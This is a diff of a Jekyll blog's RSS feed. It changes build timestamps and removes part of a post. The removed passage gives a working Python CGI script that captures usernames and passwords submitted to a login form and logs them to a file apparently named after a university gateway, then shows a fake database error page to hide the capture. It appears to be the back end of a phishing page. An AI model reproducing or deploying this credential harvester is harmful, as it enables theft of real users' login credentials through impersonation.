@@ -5,8 +5,8 @@
     <description>Welcome to my blog!</description>
     <link>https://wuyinan0126.github.io//</link>
     <atom:link href="https://wuyinan0126.github.io//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 17 Sep 2016 17:21:54 +0800</pubDate>
-    <lastBuildDate>Sat, 17 Sep 2016 17:21:54 +0800</lastBuildDate>
+    <pubDate>Sat, 17 Sep 2016 17:22:43 +0800</pubDate>
+    <lastBuildDate>Sat, 17 Sep 2016 17:22:43 +0800</lastBuildDate>
     <generator>Jekyll v3.0.2</generator>
     
       <item>
@@ -707,28 +707,6 @@ H(P\ AND\ Q)/[H(P)+H(Q)-H(P\ AND\ Q)], &amp; H(P\ AND\ Q)\gt\theta
  &amp;lt;/form&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
     &lt;/div&gt;
-
-    &lt;p&gt;编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; #!/usr/bin/python
- #-*- encoding: utf-8 -*-
- import cgi, cgitb
- form = cgi.FieldStorage()
- username = form.getvalue(&#39;username&#39;)                # 获得用户名
- password = form.getvalue(&#39;password&#39;)                # 获得密码
- f = open(&#39;/cat/gw.buaa.edu.cn.log&#39;, &#39;a&#39;)            # 注意apache是否有所写文件夹的权限！！
- f.write(&quot;%s: %s\r\n&quot; % (username, password))        # 将用户名和密码写入文件
- f.close()
- print &quot;Content-type:text/html\r\n\r\n&quot;              # 然后显示一个错误页面
- print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;&#39;
- print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Error 126&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;&#39;
- print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;&#39;
- print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Error establishing a database connection&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&#39;
- print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-
-    &lt;p&gt;将login.py的权限设置为755，即有运行权限&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ol&gt;
 
